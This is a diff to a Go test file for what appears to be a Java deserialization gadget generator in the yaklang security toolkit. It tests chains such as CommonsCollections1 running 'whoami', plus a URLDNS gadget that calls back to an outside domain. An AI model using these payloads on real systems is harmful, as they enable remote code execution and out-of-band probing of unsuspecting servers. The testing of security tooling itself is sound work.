@@ -3,13 +3,16 @@ package yso
 import (
 	"fmt"
 	"github.com/yaklang/yaklang/common/javaclassparser"
+	"github.com/yaklang/yaklang/common/utils"
 	"github.com/yaklang/yaklang/common/yak/yaklib/codec"
 	"github.com/yaklang/yaklang/common/yserx"
 	"testing"
 )
 
 func TestGenerateGadgetByGadgetName(t *testing.T) {
-	gadget, err := GenerateGadget("CommonsCollections1", SetTransformChainType("raw_cmd", "touch /tmp/a.a"))
+	gadget, err := GenerateGadget("URLDNS", SetGadgetParam(map[string]string{
+		"domain": "rahtkbblhv.dgrh3.cn",
+	}))
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -28,14 +31,23 @@ func TestGenerateGadget(t *testing.T) {
 		if gadget.IsTemplateImpl {
 			_, err = GenerateGadget(name, SetRuntimeExecEvilClass("whoami"))
 			if err != nil {
-				t.Fatal(err)
+				t.Fatal(utils.Errorf("GenerateGadget(%s) error = %v", name, err))
 			}
-		} else {
+		} else if gadget.Template == nil {
 			gadget, err := GenerateGadget(name, SetTransformChainType("raw_cmd", "whoami"))
 			if err != nil {
-				t.Fatal(err)
+				t.Fatal(utils.Errorf("GenerateGadget(%s) error = %v", name, err))
 			}
 			_ = gadget
+		} else {
+			_, err = GenerateGadget(name, SetGadgetParam(map[string]string{
+				"class":  "aaa",
+				"domain": "aaa",
+				"jndi":   "aa",
+			}))
+			if err != nil {
+				t.Fatal(utils.Errorf("GenerateGadget(%s) error = %v", name, err))
+			}
 		}
 	}
 }
